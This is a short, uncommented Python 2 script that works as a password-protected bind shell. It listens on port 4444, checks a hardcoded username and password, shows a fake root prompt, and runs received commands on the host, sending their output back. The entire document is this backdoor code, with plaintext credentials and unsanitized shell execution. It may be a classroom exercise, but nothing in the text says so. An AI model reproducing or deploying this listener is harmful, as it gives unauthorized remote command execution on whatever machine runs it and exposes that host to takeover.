import socket
import commands

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)


s.bind(("",4444))
s.listen(5)

while True:

  c,addr=s.accept()
  c.send("login:")
  user=c.recv(100) 

  c.send("password:")
  passwd=c.recv(100)

  if user.strip() == "vimal" and passwd.strip() == "lw":
	c.send("[root@server ~]#")
	cmd=c.recv(100)
	acmd=cmd.strip()
	if acmd=="exit":
	  c.close()
	else:
	  out=commands.getstatusoutput(acmd)[1]
	  c.send(out+ "\n")
	
  else:
	

    c.close()

raw_input()

